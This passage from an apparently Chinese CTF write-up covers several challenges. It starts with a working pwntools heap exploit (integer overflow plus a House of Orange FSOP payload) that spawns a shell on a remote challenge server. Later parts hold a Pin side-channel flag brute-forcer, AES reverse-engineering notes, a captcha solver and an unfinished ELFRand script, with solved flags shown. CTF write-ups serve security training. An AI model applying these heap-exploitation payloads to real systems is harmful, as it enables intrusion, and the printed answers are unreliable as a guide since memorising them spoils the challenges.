        p.sendline(str(idx))
    def edit(p, idx, note):
        p.recvuntil('choice: ')
        p.sendline('3')
        p.recvuntil('note: ')
        p.sendline(str(idx))
        p.recvuntil('note: ')
        p.sendline(note)
    def HouseOfOrange(head_addr, system_addr, io_list_all_addr):
        exp = '/bin/sh'.ljust(8, '\x00') + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)
        exp += p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
        exp += p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
        return exp
    def GameStart(ip, port, debug):
        if debug == 1:
            p = process('./justnote', env = {'LD_PRELOAD' : './libc6_2.23-0ubuntu10_amd64.so'})
            # gdb.attach(p)
        else:
            p = remote(ip, port)
        add(p, -9223372036854775808, 'hack by w1tcher')
        add(p, 100, 'hack by w1tcher')
        add(p, -9223372036854775808, 'hack by w1tcher')
        add(p, 100, 'hack by w1tcher')
        add(p, -9223372036854775808, 'hack by w1tcher')
        add(p, 100, 'hack by w1tcher')
        add(p, 100, 'hack by w1tcher')
        delete(p, 1)
        delete(p, 3)
        edit(p, 0, '\x00' * 0x108 + '\x13')
        add(p, 100, 'a' * 8)
        p.recvuntil('a' * 8)
        heap_addr = u64(p.recvline()[ : -1].ljust(8, '\x00'))
        log.info('heap addr is : ' + hex(heap_addr))
        edit(p, 2, '\x00' * 0x108 + '\x13')
        add(p, 100, '')
        p.recvuntil('out: ')
        libc_addr = u64(p.recvline()[ : -1].ljust(8, '\x00')) - 0x3c4b78
        log.info('libc addr is : ' + hex(libc_addr))
        delete(p, 5)
        edit(p, 4, '\x00' * 0x100 + HouseOfOrange(heap_addr + 0x110 * 2, libc_addr + 0x45390, libc_addr + 0x3c5520))
        p.recvuntil('choice: ')
        p.sendline('1')
        p.interactive()
    if __name__ == '__main__':
        GameStart('210.32.4.17', 13376, 0)
## RE
### Hide and Seek
大佬发现是逐字节验证，侧信道打之
    from pwn import *
    table = '_abcdefghijklmnopqrstuvwxyz{} ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;?@[\\]^`|~0123456789'
    pin = '/home/echo/Tools/pin-3.5/pin'
    binary = '/home/echo/1ctf/yws/hideandseek'
    #binary = 'C:\\Users\\echo\\Desktop\\task\\rc4\\simple_rc4.exe'
    dll = '/home/echo/Tools/pin-3.5/source/tools/ManualExamples/obj-intel64/inscount0.so'
    def getCount(flag):    
        p = process([pin,'-t',dll,'--',binary])
        p.sendline(flag)
        p.recvline()
        p.recvline()
        base = int(p.recvline().split(' ')[1].strip('\r\n'))
        p.close()
        return base
    # print getCount('1')
    # print getCount('E')
    # print getCount('EI')
    # '''
    ans = 'EIS{you_should_go_for_nascondino_world_c'
    flag = list(ans)
    for i in range(32):
        flag.append('\x00')
    # print flag
    # '''
    base =  getCount(''.join(flag))
    print flag
    for j in range(len(ans),70):
        print '-------------------Round %d-------------'%j
        for i in table:
            flag[j] = i
            data =  getCount(''.join(flag))
            print i,data
            if data > base+100:
                print 'getc',i,''.join(flag)+i
                if i=='}':
                    print ''.join(flag)
                    exit(0)
                base = data
                break
    print ''.join(flag)
    # '''
flag : EIS{you_should_go_for_nascondino_world_championship}
### Tailbone
隐藏了主要逻辑，pin追踪发现执行到了eh_frame的位置。
    .eh_frame:0000000000400790 sub_400790 proc near
    .eh_frame:0000000000400790 movaps  xmm0, xmmword ptr cs:flag
    .eh_frame:0000000000400797 movaps  xmm1, xmmword ptr cs:flag+10h
    .eh_frame:000000000040079E movaps  xmm2, xmmword ptr cs:_start
    .eh_frame:00000000004007A5 movaps  xmm3, xmmword ptr cs:unk_400540
    .eh_frame:00000000004007AC movaps  xmm4, xmmword ptr cs:unk_400550
    .eh_frame:00000000004007B3 movaps  xmm5, xmmword ptr cs:deregister_tm_clones
    .eh_frame:00000000004007BA movaps  xmm6, xmmword ptr cs:loc_400570
    .eh_frame:00000000004007C1 movaps  xmm7, xmmword ptr cs:loc_400580
    .eh_frame:00000000004007C8 movaps  xmm8, xmmword ptr cs:loc_400590
    .eh_frame:00000000004007D0 movaps  xmm9, xmmword ptr cs:register_tm_clones
    .eh_frame:00000000004007D8 aesenc  xmm0, xmm2
    .eh_frame:00000000004007DD aesenc  xmm0, xmm3
    .eh_frame:00000000004007E2 aesenc  xmm0, xmm4
    .eh_frame:00000000004007E7 aesenc  xmm0, xmm5
    .eh_frame:00000000004007EC aesenc  xmm1, xmm6
    .eh_frame:00000000004007F1 aesenc  xmm1, xmm7
    .eh_frame:00000000004007F6 aesenc  xmm1, xmm8
    .eh_frame:00000000004007FC aesenc  xmm1, xmm9
    .eh_frame:0000000000400802 movaps  xmmword ptr cs:flag, xmm0
    .eh_frame:0000000000400809 movaps  xmmword ptr cs:flag+10h, xmm1
    .eh_frame:0000000000400810 xor     rcx, rcx
    .eh_frame:0000000000400813 lea     rdi, byte_400840
    .eh_frame:000000000040081B lea     rsi, flag
    .eh_frame:0000000000400822
    .eh_frame:0000000000400822 loc_400822:                             ; CODE XREF: sub_400790+A5↓j
    .eh_frame:0000000000400822 mov     al, [rdi+rcx]
    .eh_frame:0000000000400825 cmp     al, [rsi+rcx]
    .eh_frame:0000000000400828 jnz     flag_wrong
    .eh_frame:000000000040082E inc     rcx
    .eh_frame:0000000000400831 cmp     rcx, 20h
    .eh_frame:0000000000400835 jnz     short loc_400822
    .eh_frame:0000000000400837 jmp     flag_correct
追着aesenc调了半天aesdec，解密一直不对，不明觉厉，自己复现aesenc
    AES_SubBytes(state);
    AES_ShiftRows(state);
    AES_MixColums(state);
    AES_AddRoundKey(ekey+i*16, state);
验证发现结果正确，实现解密算法
    AES_AddRoundKey(ekey+(7-i)*16, state+16);
    AES_InvMixColums(state+16);
    AES_InvShiftRows(state+16);
    AES_InvSubBytes(state+16);
解密得到flag : eis{the_fact_beyond_the_future}
## Misc
### Checkin
切片获得字符，标注后脚本识别。
    #nc 210.32.4.14 13373
    import hashlib
    import time
    alphabet = {'a5b42b1a1110ce927bb044ce85fb79f00f373a67': '1', '3af9e778b44cd054b3f5b781e54c50aace6e35b4': 't', '74718b6ed09bf13f46c32a234fed88e8d10bd925': 'd', '082ae500cf64515a38a9955c04fc1d3a1811bfd3': 'c', '5ab8693b6200afad741ee53bfdcf266aa24dafbb': 'p', 'afc5e6adf5a9cc0b58e6ac7c178eae07df1b72b1': 'o', 'a384bda7f1dd2ebade3f89397d1caa7f69bfa506': '0', 'f5fed4dce954c1e41045078cace581379dc876b8': 'n', '87ba3c2cfca4b2f0b16aba5ddc6ea82343a5314d': 'v', 'e5254052887031983f67427bbb44c2920db21e67': '5', 'c4528d82f5503762289b60c88b8532659e5ba383': 's', '6fee63f2df6dac403622abe257ab690e0f0c80f3': 'h', '4ae8782bd51089d3f7b007e52ce05b2913eb7343': 'r', 'c6bb4ec7c5eea7c541aabbd518a82956a7e05a87': 'k', '3affe3418958b49933be5a3c08f12de8a5ff95c6': 'j', '2e17477ebf20102b815a7fce27f301febbc3add6': '6', '0f9505f64d5bfecf3b398a5c1388b712bdf4b164': '3', 'fab395f036ba9be96cae6774aeb0462ba487d347': 'l', 'a2172d45506546013ca335f85d8e775c4fc1bbbf': '8', '6383eccfaec75ee683a8029a936e441c221f362c': '2', 'e6f71eb73593ec2f373b346238121f8d29e12522': 'u', '27f2d854ef251ae967702e502de771aa898c4db9': 'i', 'd497bb97dbeaf5abdec5ea2763a8da502ae97ffc': '9', '5bd096201b54e6c17ba7ad30bf14131e6fbf610d': '7', 'b8ecb62c5e1531f7ed0e8e101c275d2140880552': 'g', '6b7f7caafb9873343ce26d599f0dcd0814634a4c': 'a', '6ed74ae66b9191d896bb7f8e401661e955617391': '4', '560bb1238914d2dca8a0e658d7d7adfdd7cfa93e': 'x', 'b6434d15e299209c3510fa7a398667a6ec24ea7f': 'm', '693bdb2162d9f30deabd3eaa86ec2108ba200bbc': 'w', '21edee36d60b190108848c07aeec280e54bfb082': 'e', 'add9e6c41892ff7b9d39bf1a032f548544466240': 'b', '48fe14e3850eac4dadb3af4b7024aef0b7a02e3d': 'y', 'bebc74425afd6dd39021fb879207f1f023e2c11b': 'z', '865bbd16203ec070b32caba35dd4bad64ae5309d': 'q', '14d3f320e5b6591542474236067d0ac58bd4958a': 'f'}
    def detect(char):
        print char
        cid = hashlib.sha1(char).digest().encode('hex')
        if cid not in alphabet:
            print "what's that:"
            char = raw_input()
            alphabet[cid]= char
            print '------------'
            print alphabet
            print '------------'
        return alphabet[cid]
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('210.32.4.14', 13373))
    buf = ""
    while True:
        data = s.recv(65535)
        buf += data
        ans = ""
        if buf[-8:] == "d robot\n":
            print "bad bad robot"
            break
        if buf.find("EIS{") >= 0:
            print buf
            break
        if buf[-8:] == "aptcha: ":
            lines = buf.split('\n')
            for n in range(25):
                char = ""
                for i in lines:
                    if len(i) == 450:
                        char += i[n*18:(n*18+18)]
                        char += '\n'
                    else:
                        print i
                res = detect(char)
                ans += res
                print res
            ans += "\r\n"
            print "sending answer:", ans
            s.send(ans)
            buf = ""
            time.sleep(0.1)
    s.close()
### ELFRand
大佬告诉我二分法可以做，于是我就二分了
    from pwn import *
    ip = '210.32.4.13'
    port = 13372
    p = remote(ip,port)
    fp = open('lib.so','rb')
    content = fp.read()
    def offset(a):
        p.recvuntil('offset:')
        # print 'send offset',hex(a)
        p.sendline(hex(a))
        data = p.recvline().strip(' \r\n')
        # print data
        data = data.decode('hex')
        return data
    def read8(data,offset):
        return data[offset:offset+8].encode('hex')
    def getoffset(a):